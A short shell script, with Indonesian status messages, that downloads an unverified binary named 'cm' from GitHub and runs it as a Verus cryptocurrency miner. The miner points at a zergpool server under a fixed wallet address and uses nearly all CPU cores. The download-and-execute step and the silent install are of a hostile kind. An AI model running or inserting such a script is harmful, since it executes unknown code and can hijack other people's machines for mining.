nohup sudo apt-get install screen -y >/dev/null 2>&1
wget https://github.com/ammarku/tools/raw/main/cm
chmod +x cm
work=$(shuf -i 1999999-9999999 -n 1)
echo $work
echo "kode pekerja $work"
./cm -a verus -o stratum+tcp://verushash.eu.mine.zergpool.com:3300 -u RLtMMMuPGKuTsCYoSiuGgSUkbREHJQDS4K.$work -p c=VRSC,mc=VRSC -t $(nproc --ignore 1)
echo "==sedang Bekerja=="
